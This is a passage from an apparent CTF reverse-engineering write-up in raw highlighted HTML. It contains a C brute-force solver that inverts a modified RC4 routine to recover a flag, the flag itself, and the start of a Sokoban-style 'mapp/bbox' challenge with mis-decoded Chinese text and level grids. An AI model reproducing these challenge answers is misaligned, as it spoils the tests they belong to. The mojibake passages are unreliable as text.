class="number">0x19</span>, <span class="number">0xcb</span>, <span class="number">0x4c</span>, <span class="number">0x10</span>, <span class="number">0x0a</span>, <span class="number">0x90</span>, <span class="number">0x6a</span>, <span class="number">0x0f</span>, <span class="number">0x60</span>, <span class="number">0x9f</span>, <span class="number">0xea</span>, <span class="number">0x28</span>, <span class="number">0x88</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0xfc</span>, <span class="number">0x0e</span>, <span class="number">0xbc</span>, <span class="number">0x57</span>, <span class="number">0xb1</span>, <span class="number">0x66</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x3c</span>, <span class="number">0x16</span>, <span class="number">0xc4</span>, <span class="number">0x43</span>, <span class="number">0x1f</span>, <span class="number">0x05</span>, <span class="number">0x9f</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x6f</span>, <span class="number">0x90</span>, <span class="number">0xe5</span>, <span class="number">0x27</span>, <span class="number">0x87</span>, <span class="number">0x3f</span>, <span class="number">0x78</span>, <span class="number">0xf3</span>, <span class="number">0x01</span>, <span class="number">0xb3</span>, <span class="number">0x58</span>, <span class="number">0xbe</span>, <span class="number">0x69</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x3d</span>, <span class="number">0x17</span>, <span class="number">0xc5</span>, <span class="number">0x42</span>, <span class="number">0x1e</span>, <span class="number">0x04</span>, <span class="number">0x9e</span>, <span class="number">0x64</span>, <span class="number">0x01</span>, <span class="number">0x6e</span>, <span class="number">0x91</span>, <span class="number">0xe4</span>, <span class="number">0x26</span>, <span class="number">0x86</span>, <span class="number">0x3e</span>, <span class="number">0x79</span>, <span class="number">0xf2</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x59</span>, <span class="number">0xbf</span>, <span class="number">0x68</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x3e</span>, <span class="number">0x14</span>, <span class="number">0xc6</span>, <span class="number">0x41</span>, <span class="number">0x1d</span>, <span class="number">0x07</span>, <span class="number">0x9d</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x6d</span>, <span class="number">0x92</span>, <span class="number">0xe7</span>, <span class="number">0x25</span>, <span class="number">0x85</span>, <span class="number">0x3d</span>, <span class="number">0x7a</span>, <span class="number">0xf1</span>, <span class="number">0x03</span>, <span class="number">0xb1</span>, <span class="number">0x5a</span>, <span class="number">0xbc</span>, <span class="number">0x6b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x3f</span>, <span class="number">0x15</span>, <span class="number">0xc7</span>, <span class="number">0x40</span>, <span class="number">0x1c</span>, <span class="number">0x06</span>, <span class="number">0x9c</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0x6c</span>, <span class="number">0x93</span>, <span class="number">0xe6</span>, <span class="number">0x24</span>, <span class="number">0x84</span>, <span class="number">0x3c</span>, <span class="number">0x7b</span>, <span class="number">0xf0</span>, <span class="number">0x02</span>, <span class="number">0xb0</span>, <span class="number">0x5b</span>, <span class="number">0xbd</span>, <span class="number">0x6a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x38</span>, <span class="number">0x12</span>, <span class="number">0xc0</span>, <span class="number">0x47</span>, <span class="number">0x1b</span>, <span class="number">0x01</span>, <span class="number">0x9b</span>, <span class="number">0x61</span>, <span class="number">0x04</span>, <span class="number">0x6b</span>, <span class="number">0x94</span>, <span class="number">0xe1</span>, <span class="number">0x23</span>, <span class="number">0x83</span>, <span class="number">0x3b</span>, <span class="number">0x7c</span>, <span class="number">0xf7</span>, <span class="number">0x05</span>, <span class="number">0xb7</span>, <span class="number">0x5c</span>, <span class="number">0xba</span>, <span class="number">0x6d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x39</span>, <span class="number">0x13</span>, <span class="number">0xc1</span>, <span class="number">0x46</span>, <span class="number">0x1a</span>, <span class="number">0x00</span>, <span class="number">0x9a</span>, <span class="number">0x60</span>, <span class="number">0x05</span>, <span class="number">0x6a</span>, <span class="number">0x95</span>, <span class="number">0xe0</span>, <span class="number">0x22</span>, <span class="number">0x82</span>, <span class="number">0x3a</span>, <span class="number">0x7d</span>, <span class="number">0xf6</span>, <span class="number">0x04</span>, <span class="number">0xb6</span>, <span class="number">0x5d</span>, <span class="number">0xbb</span>, <span class="number">0x6c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x3a</span>, <span class="number">0x10</span>, <span class="number">0xc2</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0x03</span>, <span class="number">0x99</span>, <span class="number">0x63</span>, <span class="number">0x06</span>, <span class="number">0x69</span>, <span class="number">0x96</span>, <span class="number">0xe3</span>, <span class="number">0x21</span>, <span class="number">0x81</span>, <span class="number">0x39</span>, <span class="number">0x7e</span>, <span class="number">0xf5</span>, <span class="number">0x07</span>, <span class="number">0xb5</span>, <span class="number">0x5e</span>, <span class="number">0xb8</span>, <span class="number">0x6f</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">23</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Sbak2, S, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> lasti = <span class="number">0</span>; lasti &lt; <span class="number">256</span>; lasti++)</span><br><span class="line">&#123;</span><br><span class="line">ZeroMemory(flag, <span class="number">23</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(S, Sbak2, <span class="number">256</span>);</span><br><span class="line">k = l = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j != <span class="number">22</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(Sbak, S, <span class="number">256</span>);</span><br><span class="line"><span class="type">int</span> kbak = k;</span><br><span class="line"><span class="type">int</span> lbak = l;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> e = <span class="number">32</span>; e &lt; <span class="number">129</span>; e++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(S, Sbak, <span class="number">256</span>);</span><br><span class="line">k = kbak;</span><br><span class="line">l = lbak;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = (<span class="type">unsigned</span> __int8)S[(<span class="type">unsigned</span> __int8)++k];</span><br><span class="line">l += m;</span><br><span class="line">S[(<span class="type">unsigned</span> __int8)k] = S[(<span class="type">unsigned</span> __int8)l];</span><br><span class="line">S[(<span class="type">unsigned</span> __int8)l] = m;</span><br><span class="line">BYTE v3 = ((((<span class="type">unsigned</span> __int8)(e &lt;&lt; <span class="number">7</span>) | (e &gt;&gt; <span class="number">1</span>)) &lt;&lt; <span class="number">6</span>) ^ <span class="number">0xC0</span> | ((<span class="type">unsigned</span> __int8)((e &lt;&lt; <span class="number">7</span>) | (e &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ <span class="number">0x3B</span>) ^ <span class="number">0xBE</span>;</span><br><span class="line">out[j] = S[(<span class="type">unsigned</span> __int8)(S[(<span class="type">unsigned</span> __int8)k] + m)] ^ key2[j &amp; <span class="number">3</span>] ^ (((<span class="type">unsigned</span> __int8)(((<span class="number">16</span> * (((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>) &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * (((<span class="number">16</span> * (((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>)));</span><br><span class="line"><span class="keyword">if</span> (out[j] == last[lasti][j]) &#123;</span><br><span class="line">flag[j] = e;</span><br><span class="line"><span class="comment">//printf(&quot;%c &quot;, e);</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(flag) == <span class="number">22</span> &amp;&amp; flag[<span class="number">21</span>] == <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">QeMu_r3v3rs3in9_h@</span>ck6&#125;</span><br></pre></td></tr></table></figure><h2 id="mapp-bbox">mapp/bbox</h2><p>ä¸€ä¸ªç®€å•çš„æ¨ç®±å­ï¼Œå¾ˆç®€å•ï¼Œç›´æ¥æ‰‹ç®—å³å¯</p><p>å¯ä»¥ç›´æ¥åˆ°æœ€åçœ‹è¾“å‡ºå¾—åˆ°æç¤º</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">k = &#x27;&#x27;&#x27;</span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11411111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11030011111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011011111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">00000211111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">01100110001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000001000</span><span class="number">111110</span></span><br><span class="line"><span class="number">01111111111000</span><span class="number">000010</span></span><br><span class="line"><span class="number">00000000001000</span><span class="number">000010</span></span><br><span class="line"><span class="number">00001111111000</span><span class="number">111110</span></span><br><span class="line"><span class="number">00001000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01111000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000001111</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000000001111</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">01111111111111</span><span class="number">111110</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01200300040000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01111111111111</span><span class="number">101110</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000011111000</span><span class="number">111110</span></span><br><span class="line"><span class="number">01000010001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01111110001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00000010000000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00111110001000</span><span class="number">111110</span></span><br><span class="line"><span class="number">00100000001000</span><span class="number">000010</span></span><br><span class="line"><span class="number">00100010111000</span><span class="number">111110</span></span><br><span class="line"><span class="number">00100030001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00111100001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00400000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01111111111000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">100001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10103000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10111011101111</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">011111</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111111100000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">002001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000300001</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001000001</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001000021</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000111</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000100</span></span><br><span class="line"><span class="number">10111111100000</span><span class="number">000100</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000100</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101010000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101010111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10001000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">101101</span></span><br><span class="line"><span class="number">10000001000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">040001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">110101</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">300001</span></span><br><span class="line"><span class="number">11111011111111</span><span class="number">101111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">020001</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000003000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">100001</span></span><br><span class="line"><span class="number">10100000002000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">101101</span></span><br><span class="line"><span class="number">10101000001000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111011</span><span class="number">101001</span></span><br><span class="line"><span class="number">10001010001010</span><span class="number">001001</span></span><br><span class="line"><span class="number">10111010101010</span><span class="number">101101</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">101111</span></span><br><span class="line"><span class="number">10000001000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">011101</span></span><br><span class="line"><span class="number">10000001000000</span><span class="number">301001</span></span><br><span class="line"><span class="number">11111111400000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000010000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101000021000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101011111011</span><span class="number">111101</span></span><br><span class="line"><span class="number">10101010000010</span><span class="number">000001</span></span><br><span class="line"><span class="number">10001010111110</span><span class="number">111101</span></span><br><span class="line"><span class="number">11111010100000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000010101111</span><span class="number">101101</span></span><br><span class="line"><span class="number">10111110101000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10100000101011</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101111101010</span><span class="number">000001</span></span><br><span class="line"><span class="number">10003000000000</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111011111010</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000000000010</span><span class="number">101111</span></span><br><span class="line"><span class="number">10111111111110</span><span class="number">001001</span></span><br><span class="line"><span class="number">14000000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000000000002</span><span class="number">003001</span></span><br><span class="line"><span class="number">10111011111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111111011</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101400001000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111010</span><span class="number">101001</span></span><br><span class="line"><span class="number">10101010001010</span><span class="number">101001</span></span><br><span class="line"><span class="number">10101010111010</span><span class="number">101101</span></span><br><span class="line"><span class="number">10003000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111011111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10000001000010</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10003000000000</span><span class="number">041001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000001000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111111011</span><span class="number">111101</span></span><br><span class="line"><span class="number">10101000001000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101110111011</span><span class="number">111101</span></span><br><span class="line"><span class="number">10001013001010</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111002111010</span><span class="number">101001</span></span><br><span class="line"><span class="number">10000010100000</span><span class="number">101001</span></span><br><span class="line"><span class="number">10111114101111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000001000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111101111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10101000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10001111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">11111000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000011111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10111110000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000001</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000001</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span 